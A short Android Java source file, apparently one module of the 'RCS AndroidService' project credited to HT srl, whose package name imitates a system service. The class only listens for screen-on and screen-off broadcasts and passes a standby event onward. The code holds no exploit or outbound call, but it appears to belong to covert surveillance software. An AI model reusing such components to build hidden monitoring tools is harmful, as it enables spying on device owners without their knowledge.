/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : BroadcastMonitorStandby.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.service.listener;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

import com.android.service.Standby;
import com.android.service.auto.Cfg;
import com.android.service.util.Check;

public class BroadcastMonitorStandby extends BroadcastReceiver {
	/** The Constant TAG. */
	private static final String TAG = "BroadcastMonitorStandby";

	/* (non-Javadoc)
	 * @see android.content.BroadcastReceiver#onReceive(android.content.Context, android.content.Intent)
	 */
	@Override
	public void onReceive(Context context, Intent intent) {
		if(Cfg.DEBUG) Check.log( TAG + " standby notification, action: " + intent.getAction());
		
		boolean on = intent.getAction().equals(Intent.ACTION_SCREEN_ON);
		
		ListenerStandby.self().dispatch(new Standby(on));
	}
}
